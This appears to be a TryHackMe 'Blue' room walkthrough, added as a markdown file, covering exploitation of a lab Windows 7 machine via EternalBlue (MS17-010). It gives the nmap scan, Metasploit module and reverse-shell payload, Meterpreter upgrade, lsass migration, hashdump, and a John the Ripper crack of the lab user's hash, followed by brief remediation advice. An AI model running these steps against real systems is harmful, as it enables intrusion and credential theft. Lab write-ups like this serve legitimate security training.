@@ -1,0 +1,94 @@
+# TryHackMe: Blue Room Walkthrough 💙
+
+**Author:** Kopano Moshega
+**Target OS:** Windows 7 Professional 7601 Service Pack 1 (x64)
+**Vulnerability Focus:** MS17-010 (EternalBlue SMB Remote Code Execution)
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+An aggressive vulnerability script scan was executed against the target IP to discover exposed network ports and services:
+
+```bash
+nmap 10.114.129.99 -sV -vv --script vuln
+```
+
+### Key Findings:
+*   **Open Ports:** 135/tcp (RPC), 139/tcp (NetBIOS), 445/tcp (SMB), 3389/tcp (RDP)
+*   **Discovered Vulnerability:** **MS17-010 (EternalBlue)** — A critical remote code execution flaw in the Microsoft Windows SMBv1 server engine.
+
+---
+
+## 💣 Phase 2: Exploitation & Gaining Initial Access
+
+The **Metasploit Framework Console (`msfconsole`)** was utilized to locate and load the weaponized module for the discovered flaw:
+
+```msf
+msf6 > search ms17_010
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+```
+
+### Exploit Configuration:
+*   **RHOSTS:** Set to target IP (`10.114.129.99`)
+*   **Payload:** `windows/x64/shell/reverse_tcp`
+
+The exploit safely executed the non-paged pool grooming technique, successfully triggering the overwrite and establishing an active reverse command shell session.
+
+---
+
+## ⚡ Phase 3: Post-Exploitation & Privilege Escalation
+
+Once initial shell entry was successful, the raw shell command interface was sent to the background to upgrade the access channel into a powerful Meterpreter terminal:
+
+```msf
+# Backgrounding active native shell
+C:\Windows\system32>^Z
+Background session 1? [y/N] y
+
+# Upgrading to Meterpreter
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 > set SESSION 1
+msf6 > run
+```
+
+### Process Migration & Credential Harvesting
+To maintain stable systemic privileges and bypass defensive constraints, the session was migrated to **Process ID 1280 (`lsass.exe`)**, running under high-integrity `NT AUTHORITY\SYSTEM` permissions.
+
+From the secure Meterpreter environment, local security database account hashes were dumped:
+```msf
+meterpreter > hashdump
+```
+**Target Account Identified:** User `Jon`  
+**NTLM Hash Extracted:** `ffb43f0de35be4d9917ac0cc8ad57f8d`
+
+---
+
+## 🔑 Phase 4: Hash Decryption
+
+The extracted NTLM cryptographic string for user `Jon` was saved into a local host file (`John.hash`) and cracked using **John the Ripper** backed by the `rockyou.txt` dictionary file:
+
+```bash
+john John.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+```
+*   **Decrypted Password Result:** `alqfna22`
+
+---
+
+## 🏴‍☠️ Phase 5: Capture The Flag (Flags Redacted)
+
+*All actual flag text strings have been scrubbed to comply with TryHackMe's write-up policy.*
+
+*   **Flag 1 (System Root Directory):** Located at `C:\flag1.txt` 
+
+*   **Flag 2 (OS Configuration Directory):** Located at `C:\Windows\System32\config\flag2.txt`
+
+*   **Flag 3 (User Documents Profile):** Located at `C:\Users\Jon\Documents\flag3.txt`
+
+
+---
+
+## 🛡️ Vulnerabilities & Resolutions
+
+*   **Vulnerability:** Weak local storage configurations allowed fast acquisition of credential tables under low operational hurdles.
+*   **Remediation:** Enforce modern NTLM structural security, completely deactivate legacy SMBv1 configurations network-wide, and implement strict account access compartmentalization rules to prevent lateral context shifting.
